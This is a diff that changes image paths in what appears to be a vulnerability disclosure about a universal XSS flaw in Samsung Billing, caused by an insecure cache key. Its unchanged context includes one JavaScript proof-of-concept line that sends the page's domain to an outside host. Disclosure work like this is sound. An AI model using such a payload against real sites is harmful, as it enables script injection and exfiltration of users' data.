@@ -34,7 +34,7 @@
 # Description
 
 Oversecured report:
-![](Oversecured_report.png)
+![](04%20رئيسية/Samsung%20Vulnerabilities/025.%20Samsung%20Billing%20—%20Universal-XSS/Oversecured_report.png)
 
 Oversecured found a vulnerability for insecure web page caching within the app. It created a cache key by concatenating the `userId` field and the URL value. An attacker could control both of these fields.
 
@@ -142,7 +142,7 @@ new Image().src = 'http://example.com?domain=' + document.domain;
 ```
 
 The result will be as follows:
-![](Result.png)
+![](04%20رئيسية/Samsung%20Vulnerabilities/025.%20Samsung%20Billing%20—%20Universal-XSS/Result.png)
 
 ## References
 
